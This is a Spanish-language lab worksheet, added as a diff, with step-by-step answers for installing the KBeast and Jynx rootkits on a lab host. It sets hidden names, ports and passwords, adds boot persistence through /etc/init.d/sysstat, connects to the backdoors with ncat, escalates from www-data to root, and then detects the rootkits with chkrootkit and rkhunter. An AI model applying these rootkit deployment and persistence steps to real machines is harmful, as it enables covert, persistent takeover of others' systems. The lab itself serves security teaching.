@@ -1,0 +1,141 @@
+ENCOM: ifconfig eth1 192.168.1.3 up
+Backtrack: ifconfig eth0 192.168.1.2 up
+
+Desde ENCOM:
+En la práctica el acceso a la máquina ya te lo dan resuelto. 
+
+KBeast: despliegue del rootkit
+tar -xzvf ipsecs-kbeast-v1.tar.gz 
+Editar el fichero de configuración (config.h) y hacer los siguientes
+cambios:
+a. Nombre del demonio: tr0n
+b. Valores con la cadena ‘h4x’: tr0n
+c. Directorio: /usr/_tr0n_
+d. Puerto de escucha: 32123
+e. Contraseña: EndOfLine
+./setup build
+Comprobar que el despliegue ha sido exitoso:
+a. Aunque el demonio ya está corriendo con el PID que se indica,
+éste no aparece al listar los procesos.
+b. El directorio /usr/_tr0n_ no aparece listado (ni siquiera como
+oculto) pero se puede entrar en él.
+
+KBeast: consolidando la puerta trasera
+Desde ENCOM:
+chkconfig --list | grep 3:on
+sudo nano /etc/init.d/sysstat
+Después de esto:
+case "$1" in
+start|restart|reload|force-reload)
+if [ "$ENABLED" = "true" ] ; then
+log_daemon_msg "Starting $DESC" "$NAME"
+start-stop-daemon --start --quiet --exec $DAEMON -- --
+boot $SA1_OPTIONS || status=$?
+log_end_msg $status
+Módulo 3.3 4
+fi
+Añadir esto:
+su - bin -c /usr/_tr0n_/_h4x_bd > /dev/null 2>&1
+insmod /usr/_tr0n_/ipsecs-kbeast-v1.ko > /dev/null 2>&1
+
+sudo shutdown -r now
+ifconfig eth1 192.168.1.3 up
+¿Qué usuario está lanzando el demonio cada vez que se arranca la máquina?
+El usuario bin
+
+Desde Backtrack:
+
+KBeast: Conexión y captura de información
+startx
+ncat 192.168.1.3 32123
+id
+w
+nano acctlog.*
+¿A qué se corresponde el número que sirve como extensión de los archivos acttlog?
+Al UID de los usuarios
+
+Desde ENCOM:
+
+Jynx: despliegue del rootkit
+tar -xvzf jynx2.tgz
+Editar config.h con los siguientes cambios:
+a. Valores con la cadena ‘XxJynx’: Yori
+b. Localización archivo reality.so: /Yori/reality.so
+c. Contraseña: MCP
+d. ENV_VARIABLE "Yori"
+Ejecutar make y posteriormente make install INSTALL=/Yori.
+cd /Yori 
+ls
+/etc/init.d/apache2 restart
+sudo shutdown -r now
+ifconfig eth1 192.168.1.3 up
+¿Qué ventajas y desventajas tiene este rootkit respecto al anterior en su instalación?
+Es más rápido de configurar, y se accede mediante un acceso web.
+
+Desde Backtrack:
+
+Jynx: Conexión y captura de información
+Conectarse a la IP de la víctima a través del navegador web.
+Conectarse a la víctima a través del comando ncat indicando que el puerto 80 (web). Introducir la contraseña indicada en la configuración
+del rootkit. ncat 192.168.1.3 80
+Añadir como dato de conexión el puerto local 42 (puerto desde donde se iniciará la conexión). Volver a introducir la contraseña (para salir, pulsar (CTRL+C).
+ncat 192.168.1.3 80 -p 42
+Indicar como otro dato de conexión que se desea usar SSL. Volver a introducir la contraseña.
+ncat 192.168.1.3 80 --ssl -p 42
+ls
+¿Qué UID tiene nuestro usuario? ¿A quién pertenece?
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Yori=1 gpasswd /
+¿Qué UID tiene nuestro usuario? ¿A quién pertenece?
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+Desde ENCOM:
+
+Detección de los rootkits sin haberlo instalado por defecto
+sudo chkrootkit
+¿Se detecta algún indicio de rootkit?
+No, no aparece nada infectado
+sudo rkhunter --list test
+sudo rkhunter --list rootkits
+¿Sirve la versión instalada de rkhunter?
+No.
+tar -xvzf rkhunter-1.4.0.tar.gz 
+./installer.sh --install
+sudo rkhunter -c
+¿Qué rootkits se detectan?
+Ninguno
+
+Detección de los rootkits habiendolo instalado por defecto
+KBeast: 
+tar -xzvf ipsecs-kbeast-v1.tar.gz 
+./setup build
+chkconfig --list | grep 3:on
+sudo nano /etc/init.d/sysstat
+Después de esto:
+case "$1" in
+start|restart|reload|force-reload)
+if [ "$ENABLED" = "true" ] ; then
+log_daemon_msg "Starting $DESC" "$NAME"
+start-stop-daemon --start --quiet --exec $DAEMON -- --
+boot $SA1_OPTIONS || status=$?
+log_end_msg $status
+Módulo 3.3 4
+fi
+Añadir esto:
+su - bin -c /usr/_tr0n_/_h4x_bd > /dev/null 2>&1
+insmod /usr/_tr0n_/ipsecs-kbeast-v1.ko > /dev/null 2>&1
+
+pass: h4x3d
+
+tar -xvzf jynx2.tgz
+sudo make install
+
+pass: DEFAULT_PASS
+
+tar -xvzf rkhunter-1.4.0.tar.gz 
+sudo ./installer.sh --install.
+
+sudo rkhunter -c
+
+¿Qué rootkits se detectan? ¿Por qué?
+KBeast porque ha encontrado que existen los directorios por defecto de KBeast. En cambio, no ha encontrado Jynx.
